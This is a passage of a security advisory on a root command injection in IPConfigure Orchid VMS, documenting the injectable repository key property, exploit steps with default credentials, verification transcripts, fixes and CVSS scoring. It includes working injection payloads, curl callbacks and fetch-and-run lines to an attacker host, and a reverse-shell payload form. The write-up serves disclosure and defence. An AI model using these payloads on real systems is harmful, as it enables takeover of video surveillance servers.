     v
 [POCO HTTP layer]  JSON parse -> no validation -> whole-file replacement
     v
 [/etc/opt/orchid_server.properties]
     |          package.dnf.repo.gpg_key: http://x;<CMD>;#
     v
 [server restart]   triggered by the PUT itself (enableDynamicReload=false by default)
     v
 [Package_Minder_Thread init]  reads package.config_mode -> "default" -> proceeds
     |          Linux_Package_Facilitator::create_package_config(platform)
     v
 [platform detection]  find_package_config_type_ parses /etc/os-release
     |          ID=rhel / ID_LIKE=rhel  ->  2 (DNF)          [ID=ubuntu -> 1 (APT), sink not reachable]
     v
 [DNF_Package_Config::setup_repo_if_necessary_]
     |          install_repo_file_if_necessary_ -> /etc/yum.repos.d/ipconfigure.repo
     v
 [import_repo_gpg_key_ @ 0x654d0]
     |          fmt::v9::vformat("rpm --import {}", gpg_key)   <- no quotes, no escaping, no filter
     v
 [popen(cmd, "r")]  ->  /bin/sh -c "rpm --import http://x;<CMD>;#"
     v
 [root shell]  rpm --import http://x   (fails, non-fatal)
               <CMD>                   (executed, uid 0)
               #                       (comments the trailing remnant)
     v
 [artifact]  /tmp/orchid_clean_api_rce_proof.txt   owner=root uid=0 gid=0
             CLEAN_API_RCE_PROOF:0:root
```

Every arrow in that diagram is backed by either a disassembly offset quoted above or an observed artifact in section 9. No stage performs encoding: the JSON string becomes the property value, the property value becomes a `std::string`, the `std::string` becomes a substring of a command line, and the command line becomes a `/bin/sh` argument list.

### Data Flow — the four conditions the sink needs, and what gates each

```text
1. package.config_mode != "disabled"        gate @ orchid_server 0xaf219 / 0xaf230
                                            observed value on target: "default" (the shipped behaviour)
2. platform detection returns DNF (2)       gate @ libpackage_minder.so 0x3be20 (/etc/os-release)
                                            native RHEL-family hosts resolve here automatically
3. /etc/yum.repos.d/ exists                 needed by install_repo_file_if_necessary_ @ 0x64180
                                            present on any RHEL-family system
4. template map lookup succeeds             std::map::at("ipconfigure.repo") inside setup_repo_if_necessary_
                                            files expected under /opt/orchid/share/config-files/dnf/templates/:
                                              ipconfigure.repo.template                                   (77 bytes)
                                              dnf-automatic-install.timer.on-calendar.conf.template       (14 bytes)
                                              dnf-automatic-install.timer.randomized-delay.conf.template  (22 bytes)
                                            if absent, map::at throws std::out_of_range and the thread dies before the sink
```

A licence is not one of the conditions. The research record explicitly corrects an earlier assumption on this point: `Package_Minder_Thread` starts with an empty or trial licence, and the lab instance reported `"license":"trial"` through the unauthenticated version endpoint. No licence bypass is needed for the sink to fire.

## 8. Exploit Construction

### Exploit Construction — the steps

1. **Enumerate the current property set.** `GET /service/server/properties` with `Authorization: Basic YWRtaW46cGFzcw==` returns the loaded properties (24 in the lab instance). Optionally `GET /service/server/properties/info` returns the vendor's own description of every settable property together with its locked flag, which identifies writable targets and avoids the `400 Removing locked properties must be performed manually.` rejection.
2. **Build the replacement list.** Copy every returned property unchanged, then set (or append) `package.dnf.repo.gpg_key` to the payload. Locked properties must be reproduced exactly. Ensure `package.config_mode` is present and not `disabled` (`default` is the normal value).
3. **Inject.** `PUT /service/server/properties` with `Content-Type: application/json`. A `200 OK` confirms the write, and the server then restarts on its own. Passing `unsafeSkipConfirmation=true` prevents the five-minute confirmation timer from restoring the previous file (see the note at the end of this section for why execution happens either way).
4. **Wait for the restart.** The sink fires inside `Package_Minder_Thread` initialization; the artifact was observed roughly 30 seconds after the PUT, and the released tool waits 35 seconds by default.
5. **Confirm out of band.** The `popen` result is consumed and logged inside the server, not returned in the HTTP response, so confirmation comes from a server-side side effect: a marker file (used here), a DNS or HTTP callback, or an interactive session.

### Exploit Construction — the payload and the command it produces

Property value written by the API request:

```text
http://x;echo CLEAN_API_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_clean_api_rce_proof.txt;#
```

The string handed to `popen()`, and therefore to `/bin/sh -c`:

```sh
rpm --import http://x;echo CLEAN_API_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_clean_api_rce_proof.txt;#
```

How the shell parses that single line:

```text
segment 1   rpm --import http://x          fails (host does not resolve / not a key) - non-fatal
segment 2   echo CLEAN_API_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_clean_api_rce_proof.txt
                                            EXECUTES; both command substitutions are evaluated by
                                            the shell before echo runs, yielding 0 and root
segment 3   #                               opens a comment, absorbing any trailing remnant
```

The `http://x` prefix exists only so that segment 1 stays syntactically well formed and `rpm --import` still consumes an argument; any host or path works and its resolution failure is irrelevant, because `;` starts a new command regardless of the exit status of the previous one. The trailing `#` is likewise optional polish — `;` separation alone is sufficient — but it keeps the constructed line tidy when the template appends nothing after the placeholder.

Because the template is unquoted and nothing is filtered, every other shell metacharacter is equally usable: `|`, `&`, `&&`, `||`, backticks, `$()`, `<`, `>`, and newline.

### Exploit Construction — variant payloads

Identity marker (the form that produced the `uid=0(root) gid=0(root) groups=0(root)` artifact):

```text
http://x;id>/tmp/orchid_dnf_gpgkey_marker;#
```

Command-substitution proof (distinguishes real shell evaluation from a literal string write):

```text
http://x;echo CLEAN_API_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_clean_api_rce_proof.txt;#
```

Callback confirmation, for a target whose filesystem cannot be inspected:

```text
http://x;curl -s http://<attacker-host>/orchid-$(id -u)-$(hostname);#
```

Staged execution of a larger second-stage script:

```text
http://x;curl -s http://<attacker-host>/stage.sh | sh;#
```

Interactive session — payload *form* documented, never executed during this research:

```text
http://x;bash -c '<interactive bash whose stdin, stdout and stderr are redirected to a TCP socket at <attacker-host>:4444>';#
```

### Exploit Construction — the confirmation timer does not stop execution

The specification states that after the restart, unless `unsafeSkipConfirmation` is set, the changes must be confirmed within a five-minute countdown or the previous properties file is restored and the server restarts again. The ordering is what matters: the restart that fires the sink happens *before* the confirmation window opens. An operator who never confirms still gets one execution of the payload, and the rollback then restarts the server with the original `gpg_key` value. Confirmation therefore governs persistence, not reachability — which is why the released proof of concept exposes it as a switch rather than as a requirement.

### Exploit Construction — the released tool

`exploit/ipconfigure_orchid_dnf_gpg_key_rpm_import_rce.py` implements the chain over plain HTTP and TLS using only the Python standard library: authenticate, read the current property set, inject or overwrite the chosen property wrapped as `http://x;<CMD>;#`, preserve every other property including locked ones, submit the whole list, optionally request `unsafeSkipConfirmation`, print the exact command string the server will build and hand to `popen`, and optionally read the property back to confirm what persisted. Target URL, port, credentials, property name, injected command, post-restart wait and confirmation behaviour are all command-line parameters; no lab address is hard-coded, `--help` documents each one, and the file contains no comment lines.

## 9. Dynamic Verification

### Dynamic Verification — what ran, and where

The product was installed for real and exploited through its own HTTP API:

```text
artifact installed   : the vendor's Debian bundle for package ipc-orchid, control
                       Version 26.3.0, Architecture amd64, 129 MB as downloaded
                       (the record does not preserve this bundle's file name)
artifact sha-256     : recorded only as the prefix 1fe6ee62... ; integrity established by
                       an xz test of the archive's data member, which passed
artifact not used    : a separate 26.3.2 bundle from the same host, transfer-corrupted and
                       discarded - no figure in this advisory comes from it
running version      : 26.3.0 (GET /service/about and GET /service/version, unauthenticated)
host                 : <lab-host>; Linux container running systemd, Ubuntu 22.04 base, privileged
service chain        : orchid.service -> /opt/orchid/bin/orchid -c /etc/opt -> orchid_server (uid 0)
API base             : http://127.0.0.1:8080/service/   (lab override of the shipped webserver.port: 80)
credential           : HTTP Basic admin / pass  (the installer default, see section 3)
analysis material    : the same container plus the extracted package tree, r2 disassembly and rabin2 string tables
dynamic record       : 173 lines of command transcripts and artifact output for this finding
```

This is a live installation of the vendor's own package, driven through the vendor's own documented REST API with the vendor's own default credential. It is not a simulation, not a reimplementation of the handler, and not a static-only conclusion. The single place where the lab departs from a stock install is the platform branch, described in the negative list below. Everything else — the property write, the automatic restart, the sink, the uid of the spawned shell — is the product behaving as shipped.

### Dynamic Verification — the server process identity

```text
$ cat /proc/$(pgrep -x orchid_server | head -1)/status | grep -E "^(Name|Uid|Gid):"
Name:   orchid_server
Uid:    0       0       0       0
Gid:    0       0       0       0
```

Real, effective, saved-set and filesystem uids are all zero. This is the runtime confirmation of the static fact that the shipped unit file carries no `User=` directive, and it is why the injected command inherits uid 0.

### Dynamic Verification — the clean, API-driven end-to-end run

Existing markers were deleted first, then the whole chain was executed over HTTP:

```http
PUT /service/server/properties HTTP/1.1
Host: 127.0.0.1:8080
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/json

{"properties":[{"name":"archivecleaner.periodic.seconds","value":"60"}, ...24 properties, locked ones preserved...,
 {"name":"package.dnf.repo.gpg_key","value":"http://x;echo CLEAN_API_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_clean_api_rce_proof.txt;#"},
 {"name":"package.dnf.repo.url","value":"http://x"},{"name":"package.dnf.repo.name","value":"orchid"},
 {"name":"package.dnf.repo.channel","value":"stable"},{"name":"package.config_mode","value":"default"}]}

HTTP/1.1 200 OK
Content-Type: application/json

{"properties":[{"name":"archivecleaner.periodic.seconds","value":"60"}, ...injected value echoed verbatim...]}
```

The server restarted as a side effect of the write. Roughly 30 seconds later the artifact existed and was owned by root:

```text
$ ls -la /tmp/orchid_clean_api_rce_proof.txt
-rw-r--r-- 1 root root 27 <redacted-timestamp> /tmp/orchid_clean_api_rce_proof.txt

$ cat /tmp/orchid_clean_api_rce_proof.txt
CLEAN_API_RCE_PROOF:0:root

$ stat -c "owner=%U uid=%u gid=%g" /tmp/orchid_clean_api_rce_proof.txt
owner=root uid=0 gid=0
```

Reading that output: the file content proves the two command substitutions were evaluated by the shell spawned from `popen` — `$(id -u)` produced `0` and `$(whoami)` produced `root`. Had the value been passed to `rpm` as a literal string, the file would either not exist or would contain the unexpanded `$(...)` text. The ownership triple proves the execution context: uid 0, gid 0, created by a process that only the server could have been.

A second, independent proof run used different payload elements — `id` redirection plus `$(hostname)` and `$(date +%s)` substitution — and different marker names:

```text
$ ls -la /tmp/orchid_dnf_gpgkey_marker /tmp/orchid_api_rce_proof.txt
-rw-r--r-- 1 root root 39 <redacted-timestamp> /tmp/orchid_dnf_gpgkey_marker
-rw-r--r-- 1 root root 48 <redacted-timestamp> /tmp/orchid_api_rce_proof.txt

$ cat /tmp/orchid_dnf_gpgkey_marker
uid=0(root) gid=0(root) groups=0(root)

$ cat /tmp/orchid_api_rce_proof.txt
RCE_VIA_ORCHID_DNF_SINK:<container-hostname>:<epoch-seconds>
```

The 39-byte `id` output and the evaluated `$(hostname)` / `$(date +%s)` pair together rule out both a literal write and a pre-baked artifact: the second file proves that arbitrary command substitution, not just a fixed `id`, is interpreted on the target. Hostname and timestamp values are redacted here; their evaluation is the evidence, not their content.

### Dynamic Verification — the research-phase script under the same conditions

A single-purpose script written during the research phase — not the tool published in `exploit/` of this package — was run against the container's API from the lab host, and its output matches the manual run step for step. Two disclosures attach to the block below. It is a translation: the recorded run printed Chinese, and what follows renders the substance of those lines in English. And it is elided in the same way as the rest of this package: the lab address appears as a placeholder and the credential is not reproduced, exactly as timestamps and container names are redacted elsewhere above. Read it as a normalisation of the recorded output, not as a verbatim capture:

```text
[*] GET  http://<lab-api>/service/server/properties
[+] properties retrieved: 24
[+] injected package.dnf.repo.gpg_key = http://x;echo ORCHID_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_rce_proof.txt;#
[*] PUT  http://<lab-api>/service/server/properties
[+] PUT response: HTTP 200 | {"properties":[{"name":"archivecleaner.periodic.seconds","value":"60"},...
[*] waiting 35s for service restart and Package_Minder_Thread initialization
```

The third marker it produced:

```text
$ ls -la /tmp/orchid_rce_proof.txt
-rw-r--r-- 1 root root 24 <redacted-timestamp> /tmp/orchid_rce_proof.txt

$ cat /tmp/orchid_rce_proof.txt
ORCHID_RCE_PROOF:0:root

$ stat -c "owner=%U uid=%u gid=%g size=%s" /tmp/orchid_rce_proof.txt
owner=root uid=0 gid=0 size=24
```

That research-phase script depends only on the Python standard library and ran unmodified on a Python 3.6 interpreter — a deliberate portability property, since the research environment had no third-party HTTP client available. `exploit/ipconfigure_orchid_dnf_gpg_key_rpm_import_rce.py` is a parameterized re-implementation of the same chain, written afterwards for publication: it takes target, port, scheme, credentials, property name, injected command, post-restart wait and confirmation behaviour as command-line arguments and emits its own wording, and it did not exist at the time of the run transcribed above. Nothing in that block should be read as output of the released tool.

### Dynamic Verification — the DNF platform conditions, satisfied on the lab container

Because the lab container is Debian-family, three files were prepared before the API-driven run so that the DNF branch would be taken. This is lab preparation, documented here so that no reader mistakes it for shipped state:

```text
/etc/os-release rewritten from Ubuntu 22.04 (ID=ubuntu) to:
    NAME="Red Hat Enterprise Linux"
    VERSION="9.0 (Plow)"
    ID=rhel
    ID_LIKE=rhel
    VERSION_ID=9.0
    (original file kept as /etc/os-release.ubuntu.bak)

/etc/yum.repos.d/ created (absent on Ubuntu)

/opt/orchid/share/config-files/dnf/templates/ created with:
    ipconfigure.repo.template                                   77 bytes
    dnf-automatic-install.timer.on-calendar.conf.template       14 bytes
    dnf-automatic-install.timer.randomized-delay.conf.template  22 bytes

ipconfigure.repo.template content:
    [ipconfigure]
    name=Orchid Recorder
    baseurl={}
    enabled=1
    gpgcheck=1
    gpgkey={}
```

With those in place and `/etc/opt/orchid_server.properties` carrying the injected `gpg_key`, the sink fired deterministically. The container being privileged and running systemd also means the restart behaviour matched a bare-metal host; the privilege escalation demonstrated is to root *inside* the product's own server, and no container escape is claimed.

### Dynamic Verification — reproducibility across restarts

```text
$ rm -f /tmp/orchid_dnf_gpgkey_marker /tmp/orchid_api_rce_proof.txt /etc/yum.repos.d/ipconfigure.repo
$ systemctl stop orchid; sleep 2; pkill -9 orchid_server; sleep 1; systemctl start orchid; sleep 8
$ ls -la /tmp/orchid_api_rce_proof.txt
-rw-r--r-- 1 root root 48 <redacted-timestamp> /tmp/orchid_api_rce_proof.txt
$ cat /tmp/orchid_api_rce_proof.txt
RCE_VIA_ORCHID_DNF_SINK:<container-hostname>:<epoch-seconds>
```

and, in the shorter form recorded for the clean run:

```text
$ rm -f /tmp/orchid_clean_api_rce_proof.txt; systemctl restart orchid; sleep 30; cat /tmp/orchid_clean_api_rce_proof.txt
CLEAN_API_RCE_PROOF:0:root
```

Markers reappear on every service start, because the value persists in the properties file and the sink runs during thread initialization. Operationally, a single successful write yields execution on every subsequent boot, upgrade-triggered restart or crash-restart until the property is corrected — a durability property a one-shot injection would not have, and one that makes this reliable rather than racy.

### Dynamic Verification — the authentication gate, re-confirmed during exploitation

```text
[no credentials]    PUT /service/server/properties  ->  401 Unauthorized
[wrong password]    PUT /service/server/properties  ->  401 Unauthorized
[admin:pass]        PUT /service/server/properties  ->  200 OK
```

### Dynamic Verification — what was NOT exercised

Stated plainly, because the line between verification and inference has to be visible:

- **No native RHEL-family host was exploited.** Platform detection was made to return DNF by editing `/etc/os-release`, creating `/etc/yum.repos.d/` and writing the three template files listed above. On a Debian-family install the APT branch is taken and this sink is never reached.
- **No RPM package contents were recovered.** The vendor publishes an RPM for the same release on the same host; it was retrieved and inspection was attempted, but the archive header would not parse and its LZMA-compressed cpio member was corrupt, so nothing inside it — `orchid_server` included — could be extracted. The statement that RHEL-family installations ship those templates is therefore inferred from the code's requirements, not observed.
- **The interactive-session payload was never executed.** It is documented as a payload form only.
- **No lower-privileged session was tested against the write.** The Administrator-only restriction is taken from the vendor's shipped authorization tables; no Manager or Viewer account was provisioned to observe the 403 empirically.
- **No Windows build was analysed.** The vendor publishes a Windows installer with different package-management code paths; it is out of scope.
- **The confirmation-timer rollback was not timed.** Its behaviour is quoted from the specification text; the verification used a property that persisted across repeated restarts.
- **`package.dnf.repo.url`, `.name` and `.channel` metacharacter payloads were written to the properties file but produced no confirmed marker evidence.** Only the `gpg_key` sink is claimed.
- **RTSP (554), ZeroMQ camera discovery (5565), the dynamic-configuration receiver (5566), camera-side parsing and the analytics tier were enumerated but not fuzzed.** Their security posture is unknown, not clean.

## 10. Reachability and Security Impact

### Reachability — the conditions, restated as an attacker's checklist

An attacker needs: network reachability to the configured web port; a session holding the `config` permission; `package.config_mode` not set to `disabled`; and a DNF-platform host. Items two and four are the real preconditions, and item four is a property of the deployment platform rather than of anything the attacker does. Given them, exploitation is one HTTP request plus the restart that request causes by itself — no race, no memory corruption, no operator click, no second vulnerability.

### Reachability — the asymmetry between Debian-family and RHEL-family installs

The inspected Debian package tree contains no `/opt/orchid/share/config-files/` directory: `/opt/orchid/share/` holds only `date/` (tzdata) and `orchid-html/` (the SPA and the OpenAPI specification). That is consistent with the code analysis and it splits the deployment population:

- **Debian/Ubuntu installs** — not reachable through this sink. `find_package_config_type_` returns APT, and the APT key path writes a bundled keyfile to `/etc/apt/trusted.gpg.d/` rather than building a shell command.
- **RHEL-family installs** — reachable by design. `package.dnf.repo.*` exists as a property group only to serve this branch; the platform itself provides `/etc/yum.repos.d/`, `rpm` and the DNF toolchain. If the RPM ships the templates the code requires (as the Debian package ships the SPA and tzdata it requires), all four conditions hold with no operator involvement. That final clause is inference and is labelled as such.

### Reachability — the default-credential amplifier

Independently of platform, the administrative precondition costs nothing on an installation that accepted the installer default: the shipped debconf template declares `Default: pass` for `ipc-orchid/admin_password`, and `preinst` writes that value into `/etc/opt/orchid_server.properties` as `orchid.admin.password`. The research confirmed dynamically that `admin` / `pass` authenticates and that no other password does. On such a deployment the sequence from an unauthenticated network position to root on the VMS server is: read the property list, PUT one modified list, wait for the automatic restart. No secret to obtain, no user to involve, no second flaw to chain. Section 12 prices that reading separately and labels it conditional, because it depends on a deployment fact rather than on the code.

### Impact — what root on this server means

Command execution as uid 0 on an Orchid VMS server delivers: read and rewrite of the video archive, i.e. of physical-security evidence, which is an integrity problem before it is a confidentiality one; read of the SQLite configuration database whose path the shipped default configuration names as `/var/lib/orchid_server/orchid.sqlite` — what that database holds was not established by this research, and camera credentials together with user records are what a video management server's configuration store would be expected to hold, which is an expectation about the product class rather than a finding; rewrite of `/etc/opt/orchid_server.properties` to redirect package repositories, move log destinations or disable archive cleaning; persistence through the systemd unit path or any of the shared libraries loaded at start (the research record counts 70+ `liborchid_*.so` files in the full extraction, of which the partial tree retained for this write-up holds 57); live and recorded stream access through the server's own RTSP and web tiers; and lateral reach from a host that by design sits across camera VLANs and physical-security networks. No privilege-separation layer remains between the authenticated web role and the operating system. The product's audit machinery records property changes made through the API, but nothing records what the restarted process then executed, so the injection leaves no trace in the product's own audit trail.

### Impact — affected versions and the evidentiary basis

- **26.3.0** — verified by execution: the version the running service reports through `/service/about` and `/service/version`, and the version in the package control metadata. All artifacts above come from it.
- **the Debian bundle carrying control `Version: 26.3.0`** — the delivery vehicle actually installed and exploited: `Package: ipc-orchid`, `Architecture: amd64`, 129 MB as downloaded. The research record preserves its SHA-256 only as the prefix `1fe6ee62...`, and its integrity was established by an `xz` test of the archive's data member, which passed. A separately downloaded `26.3.2` bundle was discarded as transfer-corrupted and is not the source of any figure in this advisory.
- **versions earlier than 26.3.0** — not tested and not claimed. The research does not establish when the unquoted `rpm --import {}` template was introduced into `libpackage_minder.so`.
- **RHEL-family deployments generally** — claimed reachable from the code and from the existence of the `package.dnf.repo.*` property group, not verified on a native RHEL host or an RPM artifact.

### Reachability — independence from prior public work

At the time of research the national vulnerability database carried a single entry for this vendor family: CVE-2018-10956, a path traversal in the Orchid web component, recorded as fixed in release 2.0.6. That work is not ours, is not re-reported here, and is not the finding in this advisory. The distinctions:

- **Different class** — URI normalization and static-resource traversal in the request-routing layer, versus OS command injection in the DNF package-management thread.
- **Different component** — the web server's resource handling, versus `libpackage_minder.so` (`DNF_Package_Config::import_repo_gpg_key_` at `0x654d0`) and the `package.dnf.repo.gpg_key` property.
- **Different authentication position** — the historical traversal was reachable without credentials in the affected release; this injection sits behind the authenticated, `config`-scoped properties API.
- **Verified non-regression** — while exhausting the unauthenticated surface, nine traversal variants of the historical pattern were replayed against 26.3.0 and every one was rejected with `400 Illegal characters in URI path` by POCO's URI filter, before any normalization. The older issue is not present in the version analysed.

No identifier is claimed or requested in this document for the finding described here; CVE-2018-10956 is named only to keep the two issues distinguishable.

## 11. Fix Recommendations

### Fix Recommendations — the six changes that address the root cause

1. **Stop building shell command lines for the repository key import.** Replace the `popen()` execution in `DNF_Package_Config::import_repo_gpg_key_()` at `0x654d0` with argument-array execution (`posix_spawn`/`execvp` with `argv = {"rpm", "--import", gpg_key, NULL}`). Without a shell in the path, `;`, `|`, `$()`, backticks and redirections are inert data, and no quoting convention has to be maintained by future authors. This is the only fix that closes the class rather than the instance.
2. **If a shell invocation must be retained, quote the value at the construction site.** Build `rpm --import '<escaped>'` and escape every embedded `'` as the sequence `'\''`. Escaping must happen where the command string is assembled — not in the API layer — because any future caller that reaches the same template otherwise skips the defence. The vendor's own `timedatectl set-timezone '{}'` template already demonstrates this quoting shape.
3. **Validate the property at the write boundary, against its documented shape.** `package.dnf.repo.gpg_key` is a URL or a local file path. Enforce a strict pattern at `PUT`/`POST /service/server/properties` (for example `^(https?://[A-Za-z0-9._~:/?#@!$&'()*+,;=%-]+|/[A-Za-z0-9._~+/=-]+)$` after decoding), reject anything containing `;`, `|`, `&`, backtick, `$(`, `<`, `>`, newline or carriage return with a `422`, and apply the same rule to `package.dnf.repo.url`, `.name` and `.channel`, which flow into the generated `ipconfigure.repo` file and deserve the same scrutiny.
4. **Reuse the blocklist discipline that already exists in the product.** `System_Module::process_tz_request_()` strips the 21 characters `& | ; < > ( ) { } $ ' " * ? [ ] # ~ = % \`` before interpolation (blocklist at `0x47f340`). A blocklist is weaker than the two measures above — a filter that drops characters silently also corrupts legitimate values — but applying no filter at all on a path that ends in `popen()` is the defect. Where filtering is chosen, fail the request rather than silently deleting characters, so the caller learns the property was rejected.
5. **Do not treat the confirmation timer as a security control.** The five-minute confirmation-and-rollback window is a configuration-safety mechanism, but the restart that executes the injected command happens before it opens. Any assumption that unconfirmed properties are harmless is wrong for this sink; the property should be validated at write time, and package-management properties in particular could reasonably be placed on the locked list so that they cannot be modified through the API at all.
6. **Run the service unprivileged.** Add `User=` and `Group=` to the shipped `orchid.service` unit (with the file-ownership and capability changes that implies for the archive, the SQLite database and the low ports), and drop privileges before spawning package-management children. Under the current unit the injected command is root by construction; with a dedicated service account the same injection is still serious but no longer immediate host compromise, and operations such as writing to `/etc/yum.repos.d/` or invoking `rpm --import` would need a narrowly scoped helper instead.

### Fix Recommendations — operational mitigations available now

Until a fixed build is deployed: rotate the installer-default administrator password on every instance (the packaged debconf default is `pass`); restrict access to the management port to trusted administrative networks, since the write is reachable wherever the API is; set `package.config_mode` to `disabled` on hosts that do not need automated repository management, which short-circuits the thread before platform detection; monitor `/etc/opt/orchid_server.properties` and `POST`/`PUT /service/server/properties` in the product's audit trail for changes to `package.dnf.repo.*`; and alert on child processes of `orchid_server` that are not `rpm`/`dnf`/`apt`/`gpg`. The last of these detects the injection even when the payload produces no marker file.

## 12. CWE and CVSS

### CWE and CVSS classification

- **CWE-78** — Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection"): `package.dnf.repo.gpg_key` is concatenated into `rpm --import {}` and executed by `/bin/sh -c`. This is the primary classification.
- **CWE-20** — Improper Input Validation: the properties API accepts arbitrary characters for a value with a documented shape, and no validation exists between the JSON parser and the shell.
- **CWE-798** — Use of Hard-coded Credentials: the installer's debconf template declares `Default: pass` for `ipc-orchid/admin_password` and `preinst` writes it into the properties file; this is what converts the administrative precondition into a free one on default installations.
- **CWE-250** — Execution with Unnecessary Privileges: `orchid.service` has no `User=` directive, so `orchid_server` and every `popen()` child run as uid 0.
- **CWE-78 is not mitigated anywhere on the path**: no quoting at the sink, no escaping in `fmt::v9::vformat`, no filter at the API, no privilege drop below the sink.

### CWE and CVSS score — primary

```text
CVSS version 3.1
AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  =  7.2 (High)
```

Derivation from first principles, with the CVSS 3.1 weighting tables:

```text
ISS         = 1 - ((1-0.56) x (1-0.56) x (1-0.56))          = 0.914816
Impact(S:U) = 6.42 x ISS                                    = 5.873
Exploitab.  = 8.22 x 0.85(AV:N) x 0.77(AC:L) x 0.27(PR:H) x 0.85(UI:N) = 1.235
Base        = roundup(min(Impact + Exploitability, 10))     = roundup(7.108) = 7.2
```

Metric rationale:

- **AV:N** — the write is an HTTP request against the management API, reachable from any network that can reach the configured web port (default `80`).
- **AC:L** — no race, no memory-layout dependency, no operator involvement, no unusual configuration. On a DNF-platform host the four trigger conditions are the deployment's normal state, and the PUT itself causes the restart that fires the sink. Debian-family hosts are not scored `AC:H`; they are simply out of scope, because that platform takes the APT branch and never reaches this sink (section 10).
- **PR:H** — `PUT`/`POST /service/server/properties` are documented in the shipped specification as requiring the `config` permission with `Type: Base`, and the same specification's role table grants `config` in the base scope of exactly one role, **Administrator**. Manager, Viewer and Live Viewer hold no `config` permission. The privilege required is administrative control of component-wide settings and the ability to restart the server, which is the textbook definition of PR:H.
- **UI:N** — the restart is a documented side effect of the write (`enableDynamicReload` defaults to `false` on PUT), so no administrator or operator must click, approve or restart anything. The five-minute confirmation window starts *after* that restart, so declining to confirm does not prevent execution.
- **S:U** — the vulnerable component is the Orchid server process and the impacted component is the host it runs on as uid 0. Root on the VMS server is authority over the same component, not over a separate security authority, so no scope change is asserted; the pivot value described in section 10 is a consequence of that control. A scope-changed reading would compute 9.1 for `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` and is deliberately not claimed.
- **C:H / I:H / A:H** — arbitrary shell commands as uid 0 give full read of the archive and configuration database, full modification of stored video evidence and server configuration, and full availability control (including killing the recording services).

### CWE and CVSS score — conditional reading for default-credential deployments

```text
CVSS version 3.1 (conditional)
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  =  9.8 (Critical)
```

This reading applies to installations that still accept the credential the vendor's own installer declares as the default: `Default: pass` in the packaged `ipc-orchid/admin_password` debconf template, written by `preinst` into `/etc/opt/orchid_server.properties` as `orchid.admin.password`, and confirmed working by the research (`admin` / `pass` returns 200, every other password returns 401, with no forced rotation present in the installer artifacts). On such an installation there is no privilege an attacker must obtain: the `config`-scoped session is available to any network peer, and the chain from unauthenticated position to uid 0 is a single request plus an automatic restart. It is published as a labelled conditional because it depends on a deployment state rather than on the code, and any installation that rotated the password falls back to the primary 7.2 reading above. Under this project's disclosure practice the conditional is stated with its own vector and is not used as the headline score.

### CWE and CVSS score — the intermediate reading that is deliberately not adopted

The internal research record for this finding carried 8.8 High, corresponding to `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`. That arithmetic is correct for that vector — impact 5.873 plus exploitability 2.835 equals 8.708, which rounds up to 8.8 — and the figure is disclosed here so the difference is visible rather than hidden. It is not adopted, because `PR:L` is the wrong rung: CVSS 3.1 defines Low privileges as capabilities affecting settings and files owned by an ordinary user, whereas the permission this endpoint requires (`config`) is held only by the Administrator role and rewrites the whole server properties file and restarts the service. Manager-role sessions carry `monitor`, `stats` and media permissions and cannot perform the write. Choosing `PR:L` would describe a privilege model the product does not have, and choosing `PR:N` as the headline would score the deployment's credential hygiene as if it were a property of the vulnerable code.

**Summary of the three readings**:

```text
7.2  AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H   primary - Administrator-role session required (config scope)
8.8  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H   not adopted - figure carried by the research record; PR:L contradicts the role table
9.8  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   conditional - installations still accepting the installer-default password
```

This finding is classified for disclosure purposes as post-authentication root remote code execution. Unauthenticated code execution was pursued and exhausted on this product, and section 3 reproduces the evidence: 56 of the 58 specification paths require authentication, the five unauthenticated API endpoints are parameterless read-only GETs with no path to a sink, 86 authenticated operations returned 401 under both no-credential and wrong-credential probes, POCO's URI filter rejected nine traversal encodings before normalization, and more than twenty bypass techniques failed. The only unauthenticated-reachable defect observed was a 500 with `Type is not convertible to string` on type-confused login input, which is neither an authentication bypass nor an execution primitive.

---

*Research and write-up by the 0day Rubbish team. Technical detail published with a working proof of concept.*

- Advisory: https://0day-rubbish.com/blog/ipconfigure-orchid-vms-dnf-gpg-key-command-injection
- Repository: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com
